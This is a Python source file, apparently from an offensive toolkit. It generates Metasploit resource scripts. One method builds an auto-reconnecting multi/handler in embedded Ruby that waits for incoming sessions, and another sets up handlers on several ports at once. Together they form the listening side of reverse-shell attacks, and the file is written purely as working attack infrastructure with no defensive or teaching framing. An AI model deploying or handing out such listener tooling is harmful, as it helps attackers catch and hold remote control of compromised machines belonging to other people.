# listeners/advanced_listener.py
import json
import threading
import time
from datetime import datetime

class AdvancedListener:
    """Advanced listener with multiple features"""
    
    def __init__(self):
        self.listeners = {}
        self.active_sessions = {}
    
    def create_persistent_listener(self, payload, lhost, lport, max_retries=5):
        """Create listener with auto-reconnect"""
        config = {
            'payload': payload,
            'lhost': lhost,
            'lport': lport,
            'max_retries': max_retries,
            'retry_count': 0,
            'status': 'stopped',
            'created': datetime.now().isoformat()
        }
        
        listener_id = f"{lhost}:{lport}"
        self.listeners[listener_id] = config
        
        # Generate RC file with auto-reconnect
        rc_content = f"""
<ruby>
# Auto-reconnect handler
retries = 0
max_retries = {max_retries}
while retries < max_retries
  begin
    handler = framework.exploits.create('multi/handler')
    handler.datastore['PAYLOAD'] = '{payload}'
    handler.datastore['LHOST'] = '{lhost}'
    handler.datastore['LPORT'] = {lport}
    handler.datastore['ExitOnSession'] = false
    
    print_status("Starting handler...")
    handler.exploit_simple(
      'Payload' => handler.datastore['PAYLOAD'],
      'LocalInput' => nil,
      'LocalOutput' => nil,
      'RunAsJob' => true
    )
    
    # Wait for session
    while framework.sessions.length == 0
      sleep(5)
    end
    
    print_good("Session received!")
    break
    
  rescue => e
    retries += 1
    print_error("Handler failed: #{e}")
    print_status("Retry #{retries}/#{max_retries}")
    sleep(30)
  end
end
</ruby>
"""
        
        return rc_content
    
    def create_multi_port_listener(self, payload, lhost, ports):
        """Create listeners on multiple ports"""
        listeners = []
        for port in ports:
            listener_id = f"{lhost}:{port}"
            rc_file = f"listener_{port}.rc"
            
            content = f"""
use exploit/multi/handler
set payload {payload}
set LHOST {lhost}
set LPORT {port}
set ExitOnSession false
exploit -j -z
"""
            listeners.append({
                'port': port,
                'file': rc_file,
                'content': content
            })
        
        return listeners
